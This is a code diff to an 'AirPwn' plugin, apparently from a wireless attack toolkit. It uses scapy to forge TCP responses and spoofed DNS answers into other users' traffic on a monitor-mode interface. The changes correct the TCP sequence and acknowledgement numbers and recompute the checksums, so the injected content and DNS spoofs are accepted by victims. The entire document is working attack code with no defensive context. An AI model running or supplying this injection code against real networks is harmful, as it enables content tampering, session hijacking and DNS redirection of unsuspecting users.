@@ -74,11 +74,21 @@ class AirPwn(Plugin):
 						response.src, response.dst = packet.dst, packet.src
 						# Switch the ports
 						response.sport, response.dport = packet.dport, packet.sport
+						# Switch sequence and ack
+						response[TCP].seq = packet[TCP].ack
 						# Inject our data
 						response[Raw].load = open(rule[1]['response'], 'rb').read()
+						# Calculate new ack
+						response[TCP].ack = packet[TCP].seq + len(response[Raw].load)
+						#delete packet checksums
+						del response[IP].chksum
+						del response[TCP].chksum
+						#Some scapy-fu to re-calculate all checksums
+						response = response.__class__(str(response))
 						# Send the packet
 						sendp(response, iface=self.mon_interface, verbose=False)
 						logging.info("%s >> Replaced content" % response.src)
+
 				elif 'ignore' not in rule[1].keys():
 					if (re.search(rule[1]['match'], packet[Raw].load)):
 						response = packet.copy()
@@ -86,7 +96,12 @@ class AirPwn(Plugin):
 						response.addr1, response.addr2 = packet.addr2, packet.addr1
 						response.src, response.dst = packet.dst, packet.src
 						response.sport, response.dport = packet.dport, packet.sport
+						response[TCP].seq = packet[TCP].ack
 						response[Raw].load = open(rule[1]['response'], 'rb').read()
+						response[TCP].ack = packet[TCP].seq + len(response[Raw].load)
+						del response[IP].chksum
+						del response[TCP].chksum
+						response = response.__class__(str(response))
 						sendp(response, iface=self.mon_interface, verbose=False)
 						logging.info("%s >> Replaced content" % response.src)
 
@@ -109,6 +124,11 @@ class AirPwn(Plugin):
 				ttl = 900,
 				rdata = self.dnspwn
 			)
+
+			del response[IP].chksum
+			del response[UDP].chksum
+			del response[UDP].len
+			response = response.__class__(str(response))
 
 			sendp(response, iface=self.mon_interface, verbose=False)
 			logging.info("%s >> Spoofed DNS for %s" % (response.src, req_domain))
